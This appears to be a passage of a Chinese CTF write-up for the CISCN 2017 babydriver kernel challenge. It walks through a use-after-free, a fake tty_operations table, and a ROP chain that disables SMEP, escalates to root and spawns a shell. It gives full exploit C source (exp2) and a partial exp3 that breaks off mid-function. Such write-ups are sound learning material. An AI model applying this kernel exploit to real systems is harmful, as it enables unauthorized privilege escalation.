+void (*poll_put_char)(struct tty_driver *driver, int line, char ch);
+#endif
+int (*proc_show)(struct seq_file *, void *);
+} __randomize_layout;
+```
+</p>
+</details>
+<p>可以看到<code>tty_struct</code>结构偏移24的地方存放了一个<code>tty_operations</code>结构的指针，这个<code>tty_operations</code>结构都是对tty进行操作的函数指针，可以控制<code>ops</code>指针指向我们可以控制的区域。显然一次函数调用，我们能干的事情很少，所以就使用这一次调用执行stack pivot，ROP来获得持续的控制。</p>
+<p>这里使用write函数调用，在执行到write时，可以发现此时rax指向<code>tty_operations</code>的首地址，所以先在operations中构造rop。（在V1NKe师傅的<a href=https://xz.aliyun.com/t/4529#toc-4>文章</a>中可以发现write是通过<code>call [rax+0x38]</code>调用的。如果一开始，应该怎样找到这个断点地址？[todolist1] &lt;已解决>）</p>
+<p>使用<a href=https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux>extract-vmlinux</a>脚本解压得到内核镜像，再通过ROPgadget或者Ropper获得gadgets。</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>$ ./extract-vmlinux bzImage &gt; vmlinux
+$ ROPgadget --binary vmlinux &gt; gadgets
+$ ROPgadget --binary vmlinux --opcode 48cf  <span class=c1># search for iretq</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>利用流程：</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>1. 两次打开/dev/babydev设备，ioctl该设备buf为0x2e0   # sizeof(struct tty_struct) = 0x2e0
+2. 在tty_operations上布置rop
+3. 关闭一个babydev，会将buf释放一次，造成UAF
+4. open(&#34;/dev/ptmx&#34;, O_RDWR|O_NOCTTY)将使用刚释放的0x2e0空间存储tty_struct
+5. 改写tty_struct
+6. write触发
+</code></pre></td></tr></table>
+</div>
+</div><p><a href=https://github.com/clxsh/ctf_wps/blob/master/others/kernel_pwn/ciscn2017-babydriver/exp2.c>exp</a></p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span><span class=lnt>68
+</span><span class=lnt>69
+</span><span class=lnt>70
+</span><span class=lnt>71
+</span><span class=lnt>72
+</span><span class=lnt>73
+</span><span class=lnt>74
+</span><span class=lnt>75
+</span><span class=lnt>76
+</span><span class=lnt>77
+</span><span class=lnt>78
+</span><span class=lnt>79
+</span><span class=lnt>80
+</span><span class=lnt>81
+</span><span class=lnt>82
+</span><span class=lnt>83
+</span><span class=lnt>84
+</span><span class=lnt>85
+</span><span class=lnt>86
+</span><span class=lnt>87
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
+</span><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
+</span><span class=cp>#include</span> <span class=cpf>&lt;stdint.h&gt;</span><span class=cp>
+</span><span class=cp>#include</span> <span class=cpf>&lt;fcntl.h&gt;</span><span class=cp>
+</span><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
+</span><span class=cp></span>
+<span class=k>struct</span> <span class=n>trap_frame</span> <span class=p>{</span>
+    <span class=kt>uint64_t</span> <span class=n>rip</span><span class=p>;</span>
+    <span class=kt>uint64_t</span> <span class=n>cs</span><span class=p>;</span>
+    <span class=kt>uint64_t</span> <span class=n>rflags</span><span class=p>;</span>
+    <span class=kt>uint64_t</span> <span class=n>rsp</span><span class=p>;</span>
+    <span class=kt>uint64_t</span> <span class=n>ss</span><span class=p>;</span>
+<span class=p>};</span>
+<span class=k>struct</span> <span class=n>trap_frame</span> <span class=n>tf</span><span class=p>;</span>
+
+<span class=cp>#define KERNCALL __attribute__((regparm(3)))
+</span><span class=cp></span><span class=kt>void</span><span class=o>*</span> <span class=p>(</span><span class=o>*</span><span class=n>prepare_kernel_cred</span><span class=p>)(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span> <span class=n>KERNCALL</span> <span class=o>=</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span><span class=mh>0xffffffff810a1810</span><span class=p>;</span>
+<span class=kt>int</span> <span class=p>(</span><span class=o>*</span><span class=n>commit_creds</span><span class=p>)(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span> <span class=n>KERNCALL</span> <span class=o>=</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span><span class=mh>0xffffffff810a1420</span><span class=p>;</span>
+
+<span class=kt>void</span> <span class=nf>save_status</span><span class=p>()</span>
+<span class=p>{</span>
+    <span class=k>asm</span><span class=p>(</span>
+        <span class=s>&#34;mov %cs, tf+8;&#34;</span>
+        <span class=s>&#34;pushfq; popq tf+16;&#34;</span>
+        <span class=s>&#34;mov %rsp, tf+24;&#34;</span>
+        <span class=s>&#34;mov %ss, tf+32;&#34;</span>
+    <span class=p>);</span>
+    <span class=n>puts</span><span class=p>(</span><span class=s>&#34;Status saved!&#34;</span><span class=p>);</span>
+<span class=p>}</span>
+
+<span class=kt>void</span> <span class=nf>get_shell</span><span class=p>()</span>
+<span class=p>{</span>
+    <span class=n>system</span><span class=p>(</span><span class=s>&#34;/bin/sh&#34;</span><span class=p>);</span>
+<span class=p>}</span>
+
+<span class=kt>int</span> <span class=nf>get_root</span><span class=p>()</span>        <span class=c1>// 如果不加返回值，这个函数会被编译成不返回
+</span><span class=c1></span><span class=p>{</span>
+    <span class=n>commit_creds</span><span class=p>(</span><span class=n>prepare_kernel_cred</span><span class=p>(</span><span class=mi>0</span><span class=p>));</span>
+    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+<span class=p>}</span>
+
+<span class=kt>int</span> <span class=nf>main</span><span class=p>()</span>
+<span class=p>{</span>
+    <span class=n>save_status</span><span class=p>();</span>
+
+    <span class=kt>uint64_t</span> <span class=n>fake_tty_operations</span><span class=p>[</span><span class=mi>30</span><span class=p>];</span>
+    <span class=kt>uint64_t</span> <span class=n>fake_tty</span><span class=p>[</span><span class=mi>4</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span><span class=mi>0</span><span class=p>};</span>
+    <span class=kt>uint64_t</span> <span class=n>rop</span><span class=p>[</span><span class=mi>30</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span>
+        <span class=mh>0xffffffff810d238d</span><span class=p>,</span>         <span class=c1>// pop rdi ; ret 关闭SMEP
+</span><span class=c1></span>        <span class=mh>0x6f0</span><span class=p>,</span>
+        <span class=mh>0xffffffff81004d80</span><span class=p>,</span>         <span class=c1>// mov cr4, rdi ; pop rbp ; ret
+</span><span class=c1></span>        <span class=mi>0</span><span class=p>,</span>
+        <span class=n>get_root</span><span class=p>,</span>
+        <span class=mh>0xffffffff81063694</span><span class=p>,</span>         <span class=c1>// swapgs ; pop rbp ; ret
+</span><span class=c1></span>        <span class=mi>0</span><span class=p>,</span>
+        <span class=mh>0xffffffff814ee0a4</span><span class=p>,</span>         <span class=c1>// opcode: 48 cf iretq
+</span><span class=c1></span>    <span class=p>};</span>
+    <span class=n>tf</span><span class=p>.</span><span class=n>rip</span> <span class=o>=</span> <span class=n>get_shell</span><span class=p>;</span>
+    <span class=o>*</span><span class=p>(</span><span class=k>struct</span> <span class=n>trap_frame</span><span class=o>*</span><span class=p>)(</span><span class=o>&amp;</span><span class=n>rop</span><span class=p>[</span><span class=mi>8</span><span class=p>])</span> <span class=o>=</span> <span class=n>tf</span><span class=p>;</span>
+
+    <span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>30</span><span class=p>;</span> <span class=o>++</span><span class=n>i</span><span class=p>)</span> <span class=p>{</span>
+        <span class=n>fake_tty_operations</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=mh>0xFFFFFFFF8181BFC5</span><span class=p>;</span>            
+        <span class=c1>// 0xFFFFFFFF8181BFC5 : rsp, rax ; dec ebx ; jmp 0xffffffff8181bf7e 
+</span><span class=c1></span>        <span class=c1>// 0xffffffff8181bf7e: ret
+</span><span class=c1></span>        <span class=c1>// 这个gadget，ROPgadget搜索结果错误，详见ERROR节
+</span><span class=c1></span>    <span class=p>}</span>
+    <span class=n>fake_tty_operations</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=mh>0xffffffff8100ce6e</span><span class=p>;</span>                <span class=c1>// pop rax; ret
+</span><span class=c1></span>    <span class=n>fake_tty_operations</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=n>rop</span><span class=p>;</span>
+    <span class=n>fake_tty_operations</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>=</span> <span class=mh>0xFFFFFFFF8181BFC5</span><span class=p>;</span>                
+    <span class=c1>// 0xFFFFFFFF8181BFC5 : rsp, rax ; dec ebx ; jmp 0xffffffff8181bf7e 
+</span><span class=c1></span>    <span class=c1>// 0xffffffff8181bf7e: ret
+</span><span class=c1></span>
+    <span class=kt>int</span> <span class=n>fd1</span> <span class=o>=</span> <span class=n>open</span><span class=p>(</span><span class=s>&#34;/dev/babydev&#34;</span><span class=p>,</span> <span class=n>O_RDWR</span><span class=p>);</span>
+    <span class=kt>int</span> <span class=n>fd2</span> <span class=o>=</span> <span class=n>open</span><span class=p>(</span><span class=s>&#34;/dev/babydev&#34;</span><span class=p>,</span> <span class=n>O_RDWR</span><span class=p>);</span>
+    <span class=n>ioctl</span><span class=p>(</span><span class=n>fd1</span><span class=p>,</span> <span class=mh>0x10001</span><span class=p>,</span> <span class=mh>0x2e0</span><span class=p>);</span>
+    <span class=n>close</span><span class=p>(</span><span class=n>fd1</span><span class=p>);</span>
+
+    <span class=kt>int</span> <span class=n>fd_tty</span> <span class=o>=</span> <span class=n>open</span><span class=p>(</span><span class=s>&#34;/dev/ptmx&#34;</span><span class=p>,</span> <span class=n>O_RDWR</span> <span class=o>|</span> <span class=n>O_NOCTTY</span><span class=p>);</span>
+    <span class=n>read</span><span class=p>(</span><span class=n>fd2</span><span class=p>,</span> <span class=n>fake_tty</span><span class=p>,</span> <span class=mi>32</span><span class=p>);</span>
+    <span class=n>fake_tty</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>=</span> <span class=n>fake_tty_operations</span><span class=p>;</span>
+    <span class=n>write</span><span class=p>(</span><span class=n>fd2</span><span class=p>,</span> <span class=n>fake_tty</span><span class=p>,</span> <span class=mi>32</span><span class=p>);</span>
+
+    <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mi>8</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span><span class=mi>0</span><span class=p>};</span>
+    <span class=n>write</span><span class=p>(</span><span class=n>fd_tty</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=mi>8</span><span class=p>);</span>
+
+    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+<span class=p>}</span>
+</code></pre></td></tr></table>
+</div>
+</div><h4 id=exploit3>exploit3</h4>
+<p>exp3和exp2很像，差别在于使用了ioctl触发的<code>tty_operations</code>。与write不同，调用ioctl是用的<code>call rax</code>，所以rax中所存储的就是ioctl函数的地址。</p>
+<p><a href=https://github.com/clxsh/ctf_wps/blob/master/others/kernel_pwn/ciscn2017-babydriver/exp3.c>exp</a></p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>  1
+</span><span class=lnt>  2
+</span><span class=lnt>  3
+</span><span class=lnt>  4
+</span><span class=lnt>  5
+</span><span class=lnt>  6
+</span><span class=lnt>  7
+</span><span class=lnt>  8
+</span><span class=lnt>  9
+</span><span class=lnt> 10
+</span><span class=lnt> 11
+</span><span class=lnt> 12
+</span><span class=lnt> 13
+</span><span class=lnt> 14
+</span><span class=lnt> 15
+</span><span class=lnt> 16
+</span><span class=lnt> 17
+</span><span class=lnt> 18
+</span><span class=lnt> 19
+</span><span class=lnt> 20
+</span><span class=lnt> 21
+</span><span class=lnt> 22
+</span><span class=lnt> 23
+</span><span class=lnt> 24
+</span><span class=lnt> 25
+</span><span class=lnt> 26
+</span><span class=lnt> 27
+</span><span class=lnt> 28
+</span><span class=lnt> 29
+</span><span class=lnt> 30
+</span><span class=lnt> 31
+</span><span class=lnt> 32
+</span><span class=lnt> 33
+</span><span class=lnt> 34
+</span><span class=lnt> 35
+</span><span class=lnt> 36
+</span><span class=lnt> 37
+</span><span class=lnt> 38
+</span><span class=lnt> 39
+</span><span class=lnt> 40
+</span><span class=lnt> 41
+</span><span class=lnt> 42
+</span><span class=lnt> 43
+</span><span class=lnt> 44
+</span><span class=lnt> 45
+</span><span class=lnt> 46
+</span><span class=lnt> 47
+</span><span class=lnt> 48
+</span><span class=lnt> 49
+</span><span class=lnt> 50
+</span><span class=lnt> 51
+</span><span class=lnt> 52
+</span><span class=lnt> 53
+</span><span class=lnt> 54
+</span><span class=lnt> 55
+</span><span class=lnt> 56
+</span><span class=lnt> 57
+</span><span class=lnt> 58
+</span><span class=lnt> 59
+</span><span class=lnt> 60
+</span><span class=lnt> 61
+</span><span class=lnt> 62
+</span><span class=lnt> 63
+</span><span class=lnt> 64
+</span><span class=lnt> 65
+</span><span class=lnt> 66
+</span><span class=lnt> 67
+</span><span class=lnt> 68
+</span><span class=lnt> 69
+</span><span class=lnt> 70
+</span><span class=lnt> 71
+</span><span class=lnt> 72
+</span><span class=lnt> 73
+</span><span class=lnt> 74
+</span><span class=lnt> 75
+</span><span class=lnt> 76
+</span><span class=lnt> 77
+</span><span class=lnt> 78
+</span><span class=lnt> 79
+</span><span class=lnt> 80
+</span><span class=lnt> 81
+</span><span class=lnt> 82
+</span><span class=lnt> 83
+</span><span class=lnt> 84
+</span><span class=lnt> 85
+</span><span class=lnt> 86
+</span><span class=lnt> 87
+</span><span class=lnt> 88
+</span><span class=lnt> 89
+</span><span class=lnt> 90
+</span><span class=lnt> 91
+</span><span class=lnt> 92
+</span><span class=lnt> 93
+</span><span class=lnt> 94
+</span><span class=lnt> 95
+</span><span class=lnt> 96
+</span><span class=lnt> 97
+</span><span class=lnt> 98
+</span><span class=lnt> 99
+</span><span class=lnt>100
+</span><span class=lnt>101
+</span><span class=lnt>102
+</span><span class=lnt>103
+</span><span class=lnt>104
+</span><span class=lnt>105
+</span><span class=lnt>106
+</span><span class=lnt>107
+</span><span class=lnt>108
+</span><span class=lnt>109
+</span><span class=lnt>110
+</span><span class=lnt>111
+</span><span class=lnt>112
+</span><span class=lnt>113
+</span><span class=lnt>114
+</span><span class=lnt>115
+</span><span class=lnt>116
+</span><span class=lnt>117
+</span><span class=lnt>118
+</span><span class=lnt>119
+</span><span class=lnt>120
+</span><span class=lnt>121
+</span><span class=lnt>122
+</span><span class=lnt>123
+</span><span class=lnt>124
+</span><span class=lnt>125
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
+</span><span class=cp>#include</span> <span class=cpf>&lt;stdint.h&gt;</span><span class=cp>
+</span><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
+</span><span class=cp>#include</span> <span class=cpf>&lt;fcntl.h&gt;</span><span class=cp>
+</span><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
+</span><span class=cp>#include</span> <span class=cpf>&lt;sys/mman.h&gt;</span><span class=cp>
+</span><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
+</span><span class=cp>#include</span> <span class=cpf>&lt;sys/ioctl.h&gt;</span><span class=cp>
+</span><span class=cp></span>
+<span class=k>struct</span> <span class=n>trap_frame</span> <span class=p>{</span>
+    <span class=kt>uint64_t</span> <span class=n>rip</span><span class=p>;</span>
+    <span class=kt>uint64_t</span> <span class=n>cs</span><span class=p>;</span>
+    <span class=kt>uint64_t</span> <span class=n>rflag</span><span class=p>;</span>
+    <span class=kt>uint64_t</span> <span class=n>rsp</span><span class=p>;</span>
+    <span class=kt>uint64_t</span> <span class=n>ss</span><span class=p>;</span>
+<span class=p>};</span>
+<span class=k>struct</span> <span class=n>trap_frame</span> <span class=n>tf</span><span class=p>;</span>
+
+<span class=k>struct</span> <span class=n>tty_operations</span> <span class=p>{</span>
+    <span class=k>struct</span> <span class=n>tty_struct</span> <span class=o>*</span><span class=p>(</span><span class=o>*</span><span class=n>lookup</span><span class=p>)</span> <span class=p>(</span><span class=k>struct</span> <span class=n>tty_driver</span> <span class=o>*</span> <span class=n>driver</span><span class=p>,</span>
+				  <span class=k>struct</span> <span class=n>file</span> <span class=o>*</span> <span class=n>filp</span><span class=p>,</span> <span class=kt>int</span> <span class=n>idx</span><span class=p>);</span>
+    <span class=kt>int</span> <span class=p>(</span><span class=o>*</span><span class=n>install</span><span class=p>)(</span><span class=k>struct</span> <span class=n>tty_driver</span> <span class=o>*</span> <span class=n>driver</span><span class=p>,</span> <span class=k>struct</span> <span class=n>tty_struct</span> <span class=o>*</span> <span class=n>tty</span><span class=p>);</span>
+    <span class=kt>void</span> <span class=p>(</span><span class=o>*</span><span class=n>remove</span><span class=p>)(</span><span class=k>struct</span> <span class=n>tty_driver</span> <span class=o>*</span> <span class=n>driver</span><span class=p>,</span> <span class=k>struct</span> <span class=n>tty_struct</span> <span class=o>*</span> <span class=n>tty</span><span class=p>);</span>
+    <span class=kt>int</span> <span class=p>(</span><span class=o>*</span><span class=n>open</span><span class=p>)(</span><span class=k>struct</span> <span class=n>tty_struct</span> <span class=o>*</span> <span class=n>tty</span><span class=p>,</span> <span class=k>struct</span> <span class=n>file</span> <span class=o>*</span> <span class=n>filp</span><span class=p>);</span>
+    <span class=kt>void</span> <span class=p>(</span><span class=o>*</span><span class=n>close</span><span class=p>)(</span><span class=k>struct</span> <span class=n>tty_struct</span> <span class=o>*</span> <span class=n>tty</span><span class=p>,</span> <span class=k>struct</span> <span class=n>file</span> <span class=o>*</span> <span class=n>filp</span><span class=p>);</span>
+    <span class=kt>void</span> <span class=p>(</span><span class=o>*</span><span class=n>shutdown</span><span class=p>)(</span><span class=k>struct</span> <span class=n>tty_struct</span> <span class=o>*</span> <span class=n>tty</span><span class=p>);</span>
+    <span class=kt>void</span> <span class=p>(</span><span class=o>*</span><span class=n>cleanup</span><span class=p>)(</span><span class=k>struct</span> <span class=n>tty_struct</span> <span class=o>*</span> <span class=n>tty</span><span class=p>);</span>
+    <span class=kt>int</span> <span class=p>(</span><span class=o>*</span><span class=n>write</span><span class=p>)(</span><span class=k>struct</span> <span class=n>tty_struct</span> <span class=o>*</span> <span class=n>tty</span><span class=p>,</span>
+		 <span class=k>const</span> <span class=kt>unsigned</span> <span class=kt>char</span> <span class=o>*</span><span class=n>buf</span><span class=p>,</span> <span class=kt>int</span> <span class=n>count</span><span class=p>);</span>
+    <span class=kt>int</span> <span class=p>(</span><span class=o>*</span><span class=n>put_char</span><span class=p>)(</span><span class=k>struct</span> <span class=n>tty_struct</span> <span class=o>*</span> <span class=n>tty</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>char</span> <span class=n>ch</span><span class=p>);</span>
+    <span class=kt>void</span> <span class=p>(</span><span class=o>*</span><span class=n>flush_chars</span><span class=p>)(</span><span class=k>struct</span> <span class=n>tty_struct</span> <span class=o>*</span> <span class=n>tty</span><span class=p>);</span>
+    <span class=kt>int</span> <span class=p>(</span><span class=o>*</span><span class=n>write_room</span><span class=p>)(</span><span class=k>struct</span> <span class=n>tty_struct</span> <span class=o>*</span> <span class=n>tty</span><span class=p>);</span>
+    <span class=kt>int</span> <span class=p>(</span><span class=o>*</span><span class=n>chars_in_buffer</span><span class=p>)(</span><span class=k>struct</span> <span class=n>tty_struct</span> <span class=o>*</span> <span class=n>tty</span><span class=p>);</span>
+    <span class=kt>int</span> <span class=p>(</span><span class=o>*</span><span class=n>ioctl</span><span class=p>)(</span><span class=k>struct</span> <span class=n>tty_struct</span> <span class=o>*</span> <span class=n>tty</span><span class=p>,</span>
+		 <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>cmd</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>arg</span><span class=p>);</span>
+    <span class=kt>long</span> <span class=p>(</span><span class=o>*</span><span class=n>compat_ioctl</span><span class=p>)(</span><span class=k>struct</span> <span class=n>tty_struct</span> <span class=o>*</span> <span class=n>tty</span><span class=p>,</span>
+			 <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>cmd</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>arg</span><span class=p>);</span>
+    <span class=kt>void</span> <span class=p>(</span><span class=o>*</span><span class=n>set_termios</span><span class=p>)(</span><span class=k>struct</span> <span class=n>tty_struct</span> <span class=o>*</span> <span class=n>tty</span><span class=p>,</span> <span class=k>struct</span> <span class=n>ktermios</span> <span class=o>*</span> <span class=n>old</span><span class=p>);</span>
+    <span class=kt>void</span> <span class=p>(</span><span class=o>*</span><span class=n>throttle</span><span class=p>)(</span><span class=k>struct</span> <span class=n>tty_struct</span> <span class=o>*</span> <span class=n>tty</span><span class=p>);</span>
+    <span class=kt>void</span> <span class=p>(</span><span class=o>*</span><span class=n>unthrottle</span><span class=p>)(</span><span class=k>struct</span> <span class=n>tty_struct</span> <span class=o>*</span> <span class=n>tty</span><span class=p>);</span>
+    <span class=kt>void</span> <span class=p>(</span><span class=o>*</span><span class=n>stop</span><span class=p>)(</span><span class=k>struct</span> <span class=n>tty_struct</span> <span class=o>*</span> <span class=n>tty</span><span class=p>);</span>
+    <span class=kt>void</span> <span class=p>(</span><span class=o>*</span><span class=n>start</span><span class=p>)(</span><span class=k>struct</span> <span class=n>tty_struct</span> <span class=o>*</span> <span class=n>tty</span><span class=p>);</span>
+    <span class=kt>void</span> <span class=p>(</span><span class=o>*</span><span class=n>hangup</span><span class=p>)(</span><span class=k>struct</span> <span class=n>tty_struct</span> <span class=o>*</span> <span class=n>tty</span><span class=p>);</span>
+    <span class=kt>int</span> <span class=p>(</span><span class=o>*</span><span class=n>break_ctl</span><span class=p>)(</span><span class=k>struct</span> <span class=n>tty_struct</span> <span class=o>*</span> <span class=n>tty</span><span class=p>,</span> <span class=kt>int</span> <span class=n>state</span><span class=p>);</span>
+    <span class=kt>void</span> <span class=p>(</span><span class=o>*</span><span class=n>flush_buffer</span><span class=p>)(</span><span class=k>struct</span> <span class=n>tty_struct</span> <span class=o>*</span> <span class=n>tty</span><span class=p>);</span>
+    <span class=kt>void</span> <span class=p>(</span><span class=o>*</span><span class=n>set_ldisc</span><span class=p>)(</span><span class=k>struct</span> <span class=n>tty_struct</span> <span class=o>*</span> <span class=n>tty</span><span class=p>);</span>
+    <span class=kt>void</span> <span class=p>(</span><span class=o>*</span><span class=n>wait_until_sent</span><span class=p>)(</span><span class=k>struct</span> <span class=n>tty_struct</span> <span class=o>*</span> <span class=n>tty</span><span class=p>,</span> <span class=kt>int</span> <span class=n>timeout</span><span class=p>);</span>
+    <span class=kt>void</span> <span class=p>(</span><span class=o>*</span><span class=n>send_xchar</span><span class=p>)(</span><span class=k>struct</span> <span class=n>tty_struct</span> <span class=o>*</span> <span class=n>tty</span><span class=p>,</span> <span class=kt>char</span> <span class=n>ch</span><span class=p>);</span>
+    <span class=kt>int</span> <span class=p>(</span><span class=o>*</span><span class=n>tiocmget</span><span class=p>)(</span><span class=k>struct</span> <span class=n>tty_struct</span> <span class=o>*</span> <span class=n>tty</span><span class=p>);</span>
+    <span class=kt>int</span> <span class=p>(</span><span class=o>*</span><span class=n>tiocmset</span><span class=p>)(</span><span class=k>struct</span> <span class=n>tty_struct</span> <span class=o>*</span> <span class=n>tty</span><span class=p>,</span>
+		    <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>set</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>clear</span><span class=p>);</span>
+    <span class=kt>int</span> <span class=p>(</span><span class=o>*</span><span class=n>resize</span><span class=p>)(</span><span class=k>struct</span> <span class=n>tty_struct</span> <span class=o>*</span> <span class=n>tty</span><span class=p>,</span> <span class=k>struct</span> <span class=n>winsize</span> <span class=o>*</span> <span class=n>ws</span><span class=p>);</span>
+    <span class=kt>int</span> <span class=p>(</span><span class=o>*</span><span class=n>set_termiox</span><span class=p>)(</span><span class=k>struct</span> <span class=n>tty_struct</span> <span class=o>*</span> <span class=n>tty</span><span class=p>,</span> <span class=k>struct</span> <span class=n>termiox</span> <span class=o>*</span> <span class=n>tnew</span><span class=p>);</span>
+    <span class=kt>int</span> <span class=p>(</span><span class=o>*</span><span class=n>get_icount</span><span class=p>)(</span><span class=k>struct</span> <span class=n>tty_struct</span> <span class=o>*</span> <span class=n>tty</span><span class=p>,</span>
+		      <span class=k>struct</span> <span class=n>serial_icounter_struct</span> <span class=o>*</span> <span class=n>icount</span><span class=p>);</span>
+    <span class=k>const</span> <span class=k>struct</span> <span class=n>file_operations</span> <span class=o>*</span><span class=n>proc_fops</span><span class=p>;</span>
+<span class=p>};</span>
+
+<span class=cp>#define KERNCALL __attribute__((regparm(3)))
+</span><span class=cp></span><span class=kt>void</span><span class=o>*</span> <span class=p>(</span><span class=o>*</span><span class=n>prepare_kernel_cred</span><span class=p>)(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span> <span class=n>KERNCALL</span> <span class=o>=</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span><span class=mh>0xffffffff810a1810</span><span class=p>;</span>
+<span class=kt>int</span> <span class=p>(</span><span class=o>*</span><span class=n>commit_creds</span><span class=p>)(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span> <span class=n>KERNCALL</span> <span class=o>=</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span><span class=mh>0xffffffff810a1420</span><span class=p>;</span>
+
+<span class=kt>uint64_t</span> <span class=n>xchgeaxesp</span> <span class=o>=</span> <span class=mh>0xffffffff810e81e8</span><span class=p>;</span>         <span class=c1>// 0xffffffff810e81e8 : xchg eax, esp ; ret
+</span><span class=c1></span>
+<span class=kt>void</span> <span class=nf>save_status</span><span class=p>()</span>
+<span class=p>{</span>
+    <span class=k>asm</span><span class=p>(</span>
+        <span class=s>&#34;mov %cs, tf+8;&#34;</span>
+        <span class=s>&#34;pushfq; popq tf+16;&#34;</span>
+        <span class=s>&#34;mov %rsp, tf+24;&#34;</span>
+        <span class=s>&#34;mov %ss, tf+32;&#34;</span>
+    <span class=p>);</span>
+    <span class=c1>// puts(&#34;status saved!&#34;);
+</span><span class=c1></span><span class=p>}</span>
+
+<span class=kt>void</span> <span class=nf>get_shell</span><span class=p>()</span>
+<span class=p>{</span>
+    <span class=n>system</span><span class=p>(</span><span class=s>&#34;/bin/sh&#34;</span><span class=p>);</span>
+<span class=p>}</span>
+
+<span class=kt>int</span> <span class=nf>get_root</span><span class=p>()</span>
+<span class=p>{</span>
+    <span class=n>commit_creds</span><span class=p>(</span><span class=n>prepare_kernel_cred</span><span class=p>(</span><span class=nb>NULL</span><span class=p>));</span>
+    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+<span class=p>}</span>
+
+<span class=kt>int</span> <span class=nf>main</span><span class=p>()</span>
+<span class=p>{</span>
